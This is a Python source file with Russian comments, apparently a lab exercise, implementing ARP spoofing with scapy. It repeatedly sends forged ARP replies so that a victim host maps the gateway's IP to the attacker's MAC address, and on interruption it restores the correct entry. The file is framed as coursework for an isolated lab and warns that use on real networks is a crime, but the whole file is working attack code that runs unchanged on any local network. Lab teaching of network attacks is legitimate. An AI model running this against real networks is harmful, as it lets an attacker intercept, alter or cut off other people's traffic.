#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
arp_spoof.py — учебный ARP-спуфинг (ARP-отравление) в лабораторной сети.

Идея атаки: протокол ARP не имеет аутентификации. Кто угодно может сказать
хосту «IP-адрес шлюза — это МОЙ MAC-адрес», и хост поверит.
Итог: трафик жертвы уходит атакующему (прослушивание/подмена/обрыв).

!!! ТОЛЬКО изолированная лабораторная сеть. На реальной сети это преступление.

Скрипт умеет главное для отчёта:
  * при Ctrl+C ВОССТАНАВЛИВАЕТ корректную ARP-запись жертвы (чтобы не ломать стенд).

Запуск (атакующая ВМ Alpine Linux):
    sudo python3 arp_spoof.py eth0 192.168.56.10 192.168.56.1
                          ^iface ^жертва      ^адрес, который подменяем (шлюз)
"""

import argparse
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp


def resolve_mac(ip: str, iface: str) -> str:
    """Узнать MAC-адрес хоста через ARP-запрос (аналог `arping`).

    ВНИМАНИЕ: getmacbyip() сам выбирает интерфейс по таблице маршрутизации,
    параметра `iface` у неё НЕТ (проверено на scapy 2.8).
    """
    mac = getmacbyip(ip)
    if not mac:
        sys.exit(f"[!] Не удалось узнать MAC для {ip}. Проверьте IP, "
                 f"что интерфейс `{iface}` поднят и что хост отвечает на ping.")
    return mac


def arp_reply(iface: str, dst_mac: str, dst_ip: str,
              src_ip: str, src_mac: str):
    """Собрать ARP-reply: «адрес src_ip принадлежит src_mac»."""
    return (Ether(src=src_mac, dst=dst_mac) /
            ARP(op=2, hwsrc=src_mac, psrc=src_ip,
                hwdst=dst_mac, pdst=dst_ip))


def main() -> None:
    ap = argparse.ArgumentParser(description="Учебный ARP-спуфинг (только лабораторная сеть!)")
    ap.add_argument("iface", help="интерфейс, например eth0")
    ap.add_argument("victim_ip", help="IP жертвы (кому врём)")
    ap.add_argument("spoof_ip", help="IP, который подменяем (обычно шлюз)")
    ap.add_argument("--interval", type=float, default=2.0, help="период повторения, с")
    args = ap.parse_args()

    my_mac = get_if_hwaddr(args.iface)             # наш MAC — его и «продаём»
    victim_mac = resolve_mac(args.victim_ip, args.iface)
    real_mac = resolve_mac(args.spoof_ip, args.iface)

    print(f"[*] Интерфейс:      {args.iface}")
    print(f"[*] Наш MAC:        {my_mac}")
    print(f"[*] Жертва:         {args.victim_ip}  -> {victim_mac}")
    print(f"[*] Подменяем:      {args.spoof_ip}  (настоящий MAC {real_mac})")
    print("[!] Прервать и восстановить таблицу: Ctrl+C")

    poison = arp_reply(args.iface, victim_mac, args.victim_ip, args.spoof_ip, my_mac)

    sent = 0
    try:
        while True:
            sendp(poison, iface=args.iface, verbose=0)
            sent += 1
            print(f"\r[*] Отправлено ARP-reply: {sent}", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Восстанавливаем корректную ARP-запись...")
    finally:
        # возвращаем жертве ПРАВИЛЬНУЮ связку IP <-> MAC (несколько раз для надёжности)
        restore = arp_reply(args.iface, victim_mac, args.victim_ip,
                            args.spoof_ip, real_mac)
        sendp([restore] * 5, iface=args.iface, inter=0.3, verbose=0)
        print("[*] Готово: таблица ARP на жертве восстановлена.")


if __name__ == "__main__":
    main()
